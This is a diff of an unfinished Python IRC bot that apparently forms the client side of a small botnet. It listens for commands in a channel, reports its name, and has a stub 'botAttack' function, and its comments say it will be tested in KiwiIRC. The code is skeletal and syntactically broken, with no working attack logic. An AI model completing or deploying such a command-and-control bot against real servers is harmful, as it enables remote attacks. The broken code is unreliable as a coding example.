@@ -17,7 +17,7 @@ CONSTATUS = False
 SHUTDOWN = False 
 
 # Bot Info
-botNick = "IRC_BOT" str(random.randrange(10000))
+botNick = "SLAVE_PLEB" str(random.randrange(10000))
 conNick = None 
 attackCount = 0
 
@@ -42,7 +42,7 @@ def joinChannel(HOST, PORT, CHANNEL, PHRASE):
 def sendPrivate() 
 
 # Bot listens for commands from IRC
-def getCommand():
+def getCommand(command):
 
     # Parse commands
 
@@ -68,14 +68,15 @@ def getCommand():
 
 # Do pingPong protocol
 def pingPong():
-    # Receive data here 
-    if data.
+    # Send PONG
 
 
 # DO COMMAND ACTIONS HERE -----------------------------
 
-# Send Stats
-def botStatus()
+# Send Stats (Just the name of bot)
+def botStatus():
+    global botNick
+    sendPrivate(botNick)
 
 # Attack Server
 def botAttack():
@@ -138,8 +139,21 @@ def handler(self):
 
     # Receive Data here 
 
+    # Parse Data 
+
+    # If data startswith PING, send PONG
+    pingPong()
+
+    # elif check if data is a command
+    getCommand(data)
+
+    # else just pass 
 
 
+"""
+WE WILL TEST THIS BOT IN KIWIIRC 
+WE MAKE OUR OWN CHANNELS N STUFF
+"""
 
 # Main Start
 if __name__ == "__main__":
